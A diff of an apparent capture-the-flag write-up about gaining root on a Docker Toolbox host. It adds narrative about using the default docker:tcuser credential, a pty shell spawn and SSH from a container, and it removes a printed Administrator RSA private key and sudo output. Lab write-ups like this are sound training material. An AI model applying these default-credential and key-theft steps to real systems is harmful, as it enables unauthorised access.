@@ -96,6 +96,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ```
 
 #### FTP Enumeration:
+We can find `docker-toolbox.exe`.
 ```
 root@kali:~# ftp 10.10.10.236
 Connected to 10.10.10.236.
@@ -376,20 +377,7 @@ f0183e44378ea9774433e2ca6ac78c6a  flag.txt
 
 ## 3. Getting Root
 
-```
-postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ cat /etc/os-release
-cat /etc/os-release
-PRETTY_NAME="Debian GNU/Linux 10 (buster)"
-NAME="Debian GNU/Linux"
-VERSION_ID="10"
-VERSION="10 (buster)"
-VERSION_CODENAME=buster
-ID=debian
-HOME_URL="https://www.debian.org/"
-SUPPORT_URL="https://www.debian.org/support"
-BUG_REPORT_URL="https://bugs.debian.org/"
-```
-
+Now we had a shell in a container of `docker-toolbox`.
 ```
 postgres@bc56e3cc55e9:/var/lib/postgresql$ ifconfig
 ifconfig
@@ -411,9 +399,13 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 
 ```
 
+According to the document,<br>
+The default credential is `docker:tcuser`.<br>
+To SSH, we have to spawn an interactive TTY shell using python3.
 ```
 postgres@bc56e3cc55e9:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
 postgres@bc56e3cc55e9:/$ ssh docker@172.17.0.1
 ssh docker@172.17.0.1
 docker@172.17.0.1's password: tcuser
@@ -425,46 +417,7 @@ docker@172.17.0.1's password: tcuser
 docker@box:~$ 
 ```
 
-```
-docker@box:/c/Users/Administrator/.ssh$ cat id_rsa                             
-cat id_rsa
------BEGIN RSA PRIVATE KEY-----
-MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
-Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
-M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
-7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
-4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
-aJ1GunZCyic0iSwemcBJiNyfZChTipWmBMK88wIDAQABAoIBAH7PEuBOj+UHrM+G
-Stxb24LYrUa9nBPnaDvJD4LBishLzelhGNspLFP2EjTJiXTu5b/1E82qK8IPhVlC
-JApdhvDsktA9eWdp2NnFXHbiCg0IFWb/MFdJd/ccd/9Qqq4aos+pWH+BSFcOvUlD
-vg+BmH7RK7V1NVFk2eyCuS4YajTW+VEwD3uBAl5ErXuKa2VP6HMKPDLPvOGgBf9c
-l0l2v75cGjiK02xVu3aFyKf3d7t/GJBgu4zekPKVsiuSA+22ZVcTi653Tum1WUqG
-MjuYDIaKmIt9QTn81H5jAQG6CMLlB1LZGoOJuuLhtZ4qW9fU36HpuAzUbG0E/Fq9
-jLgX0aECgYEA4if4borc0Y6xFJxuPbwGZeovUExwYzlDvNDF4/Vbqnb/Zm7rTW/m
-YPYgEx/p15rBh0pmxkUUybyVjkqHQFKRgu5FSb9IVGKtzNCtfyxDgsOm8DBUvFvo
-qgieIC1S7sj78CYw1stPNWS9lclTbbMyqQVjLUvOAULm03ew3KtkURECgYEA17Nr
-Ejcb6JWBnoGyL/yEG44h3fHAUOHpVjEeNkXiBIdQEKcroW9WZY9YlKVU/pIPhJ+S
-7s++kIu014H+E2SV3qgHknqwNIzTWXbmqnclI/DSqWs19BJlD0/YUcFnpkFG08Xu
-iWNSUKGb0R7zhUTZ136+Pn9TEGUXQMmBCEOJLcMCgYBj9bTJ71iwyzgb2xSi9sOB
-MmRdQpv+T2ZQQ5rkKiOtEdHLTcV1Qbt7Ke59ZYKvSHi3urv4cLpCfLdB4FEtrhEg
-5P39Ha3zlnYpbCbzafYhCydzTHl3k8wfs5VotX/NiUpKGCdIGS7Wc8OUPBtDBoyi
-xn3SnIneZtqtp16l+p9pcQKBgAg1Xbe9vSQmvF4J1XwaAfUCfatyjb0GO9j52Yp7
-MlS1yYg4tGJaWFFZGSfe+tMNP+XuJKtN4JSjnGgvHDoks8dbYZ5jaN03Frvq2HBY
-RGOPwJSN7emx4YKpqTPDRmx/Q3C/sYos628CF2nn4aCKtDeNLTQ3qDORhUcD5BMq
-bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
-q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
-BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
------END RSA PRIVATE KEY-----
-```
-
-```
-docker@box:/c/Users/Administrator/.ssh$ sudo -l                                
-sudo -l
-User docker may run the following commands on this host:
-    (root) NOPASSWD: ALL
-
-```
-
+In `/c/Users/Administrator/desktop`, we can find `root.txt` (Is this intended?)
 ```
 docker@box:/c/Users/Administrator/desktop$ cat root.txt                        
 cat root.txt
